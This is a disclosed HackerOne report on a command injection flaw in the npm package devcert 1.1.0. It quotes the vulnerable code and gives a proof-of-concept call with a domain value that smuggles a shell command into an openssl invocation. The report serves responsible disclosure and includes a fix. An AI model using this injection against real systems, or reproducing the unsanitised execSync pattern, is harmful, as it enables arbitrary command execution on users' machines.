# [devcert] Command Injection via insecure command formatting

## Report Details
- **Report ID**: 863544
- **URL**: https://hackerone.com/reports/863544
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-04-30T21:41:23.951Z
- **Disclosed**: 2020-06-15T16:02:48.968Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `Command Injection` issue in the `devcert` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `devcert`
**version:** `1.1.0`
**npm page:** `https://www.npmjs.com/package/devcert`

## Module Description

devcert - Development SSL made easy

## Module Stats

[276,467] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

I tested the `certificateFor` function.

Here's the code which causes the issue:

```javascript
// https://github.com/davewasmer/devcert/blob/2b1b8d40eda251616bf74fd69f00ae8222ca1171/src/index.ts#L95

export async function certificateFor<O extends Options>(domain: string, options: O = {} as O): Promise<IReturnData<O>> { // <-- starting point
  debug(`Certificate requested for ${ domain }. Skipping certutil install: ${ Boolean(options.skipCertutilInstall) }. Skipping hosts file: ${ Boolean(options.skipHostsFile) }`);

  if (options.ui) {
    Object.assign(UI, options.ui);
  }

  if (!isMac && !isLinux && !isWindows) {
    throw new Error(`Platform not supported: "${ process.platform }"`);
  }

  if (!commandExists('openssl')) {
    throw new Error('OpenSSL not found: OpenSSL is required to generate SSL certificates - make sure it is installed and available in your PATH');
  }

  let domainKeyPath = pathForDomain(domain, `private-key.key`);
  let domainCertPath = pathForDomain(domain, `certificate.crt`);

  if (!exists(rootCAKeyPath)) {
    debug('Root CA is not installed yet, so it must be our first run. Installing root CA ...');
    await installCertificateAuthority(options);
  } else if (options.getCaBuffer || options.getCaPath) {
    debug('Root CA is not readable, but it probably is because an earlier version of devcert locked it. Trying to fix...');
    await ensureCACertReadable(options);
  }

  if (!exists(pathForDomain(domain, `certificate.crt`))) { 
    debug(`Can't find certificate file for ${ domain }, so it must be the first request for ${ domain }. Generating and caching ...`);
    await generateDomainCertificate(domain); // <-- domain is our payload
  }
  ....


...
// https://github.com/davewasmer/devcert/blob/master/src/constants.ts#L19
export const pathForDomain: (domain: string, ...pathSegments: string[]) => string = path.join.bind(path, domainsDir)
...

// https://github.com/davewasmer/devcert/blob/master/src/certificates.ts#L44
...
export default async function generateDomainCertificate(domain: string): Promise<void> {
  mkdirp(pathForDomain(domain));

  debug(`Generating private key for ${ domain }`);
  let domainKeyPath = pathForDomain(domain, 'private-key.key');  // <-- the variable is in the form 
  generateKey(domainKeyPath);

  debug(`Generating certificate signing request for ${ domain }`);
  let csrFile = pathForDomain(domain, `certificate-signing-request.csr`);
  withDomainSigningRequestConfig(domain, (configpath) => {
    openssl(`req -new -config "${ configpath }" -key "${ domainKeyPath }" -out "${ csrFile }"`);
  });

  debug(`Generating certificate for ${ domain } from signing request and signing with root CA`);
  let domainCertPath = pathForDomain(domain, `certificate.crt`);

  await withCertificateAuthorityCredentials(({ caKeyPath, caCertPath }) => {
    withDomainCertificateConfig(domain, (domainCertConfigPath) => {
      openssl(`ca -config "${ domainCertConfigPath }" -in "${ csrFile }" -out "${ domainCertPath }" -keyfile "${ caKeyPath }" -cert "${ caCertPath }" -days 825 -batch`)
    });
  });
}

// Generate a cryptographic key, used to sign certificates or certificate signing requests.
export function generateKey(filename: string): void {
  debug(`generateKey: ${ filename }`);  // <-- injection
  openssl(`genrsa -out "${ filename }" 2048`);
  chmod(filename, 400);
}
```

The input parameter `domain` is used to build the `domainKeyPath` variable.
If we pass `\";touch HACKED;\"` as input, the variable  `domainKeyPath` will be something like this: `/home/ubuntu/.config/devcert/domains/";touch HACKED;"/private-key.key` (the first part depends on your OS).
As we can see the variable contains a valid shell command. Then, this variable is passed to the function `generateKey`, that finally calls `openssl` function:
```javascript
// https://github.com/davewasmer/devcert/blob/master/src/utils.ts#L12
import { execSync, ExecSyncOptions } from 'child_process';
import tmp from 'tmp';
import createDebug from 'debug';
import path from 'path';
import sudoPrompt from 'sudo-prompt';

import { configPath } from './constants';

const debug = createDebug('devcert:util');

export function openssl(cmd: string) {
  return run(`openssl ${ cmd }`, {  // <-- the command executed is: openssl genrsa -out "/home/ubuntu/.config/devcert/domains/";touch HACKED;"/private-key.key" 2048
    stdio: 'pipe',
    env: Object.assign({
      RANDFILE: path.join(configPath('.rnd'))
    }, process.env)
  });
}

export function run(cmd: string, options: ExecSyncOptions = {}) {
  debug(`exec: \`${ cmd }\``);
  return execSync(cmd, options);  // <-- call child_process.execSync 
}
...

```

## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `devcert` module:
    -  `npm i devcert`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const devcert = require('devcert');

async function poc() {
    let ssl = await devcert.certificateFor('\";touch HACKED;\"');
}
poc()
```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F810294}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.execSync`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v13.13.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `devcert` module via insecure command formatting.

## Attachments
- poc_devcert.mov
